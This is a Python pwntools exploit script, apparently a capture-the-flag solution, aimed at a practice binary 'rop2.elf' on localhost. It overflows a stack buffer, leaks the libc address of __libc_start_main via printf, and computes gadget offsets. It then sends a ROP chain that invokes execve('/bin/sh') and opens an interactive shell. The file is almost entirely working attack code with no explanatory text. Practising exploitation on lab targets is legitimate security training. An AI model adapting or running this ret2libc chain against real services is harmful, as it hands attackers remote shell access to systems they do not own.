import pwn

PORT=5001
HOST='localhost'

elf = pwn.ELF('./rop2.elf')
pwn.context.arch = 'x86-64'

addr = {}
addr['main'] = elf.symbols['main']

addr['_got__libc_start_main'] = elf.got['__libc_start_main']
addr['printf'] = elf.plt['printf']
addr['gets'] = elf.plt['gets']
addr['pop_rdi_ret'] = 0x00000000004011be
addr['pop_rdx_ret'] = 0x00000000004011c0
addr['ret'] = 0x000000000040101a
addr['.data'] = 0x0000000000404042

libc_elf = pwn.ELF('libc.so.6')
libc = {}
libc['__libc_start_main'] = libc_elf.symbols['__libc_start_main']
libc['pop_rdi_ret'] = 0x000000000002a3e5
libc['pop_rsi_ret'] = 0x000000000002be51
libc['pop_rdx_ret'] = 0x0000000000170337
libc['pop_rax_ret'] = 0x0000000000045eb0
libc['syscall'] = 0x0000000000029db4

ld_offset = 0x7ffff7c00000

def exploit():
    io = pwn.remote(host=HOST,port=PORT)

    recv = io.recv(1024)
    print(f'recv = {recv}')

    print("-----------------------------------------")
    payload = pwn.flat(
        b'A' * 0x20,

        pwn.pack(0),
        pwn.pack(addr['pop_rdi_ret']),

        pwn.pack(addr['_got__libc_start_main']),
        pwn.pack(addr['ret']),

        pwn.pack(addr['printf']),
        pwn.pack(addr['main']+5),

        b'\n'
    )

    print(f"payload = {payload}")
    io.send(payload)

    recv = io.recvrepeat(1)
    print(f'recv = {recv}')

    addr['__libc_start_main'] = pwn.unpack(recv[0:6],word_size='48')
    addr['pop_rax_ret'] = addr['__libc_start_main'] - libc['__libc_start_main'] + libc['pop_rax_ret']
    addr['pop_rsi_ret'] = addr['__libc_start_main'] - libc['__libc_start_main'] + libc['pop_rsi_ret']
    addr['syscall'] = addr['__libc_start_main'] - libc['__libc_start_main'] + libc['syscall']
    addr['libc'] = addr['__libc_start_main'] - libc['__libc_start_main']

    print("-----------------------------------------")
    payload = pwn.flat(
        b'A' * 0x20,

        pwn.pack(0),
        pwn.pack(addr['pop_rdi_ret']),
        
        pwn.pack(addr['.data']),
        pwn.pack(addr['ret']),

        pwn.pack(addr['gets']),
        pwn.pack(addr['pop_rdi_ret']),
        
        pwn.pack(addr['.data']),
        pwn.pack(addr['pop_rsi_ret']),

        pwn.pack(0),
        pwn.pack(addr['pop_rdx_ret']),

        pwn.pack(0),
        pwn.pack(addr['pop_rax_ret']),

        pwn.pack(59),
        pwn.pack(addr['ret']),

        pwn.pack(addr['syscall']),

        b'\n'
    )

    print(f"payload = {payload}")
    io.send(payload)


    recv = io.recvrepeat(1)
    print(f'recv = {recv}')

    payload = pwn.flat(
        b'/bin/sh',
        b'\n'
    )

    io.send(payload)

    recv = io.recvrepeat(1)
    print(f'recv = {recv}')
    io.interactive()


    

if(__name__=='__main__'):
    exploit()
    print("--------------INFO----------------")
    print(f"addr['main'] = {hex(addr['main'])}")
    print(f"addr['gets'] = {hex(addr['gets'])}")
    print(f"addr['printf'] = {hex(addr['printf'])}")
    print(f"addr['__libc_start_main'] = {hex(addr['__libc_start_main'])}")
    print(f"addr['libc'] = {hex(addr['libc'])}")
    
    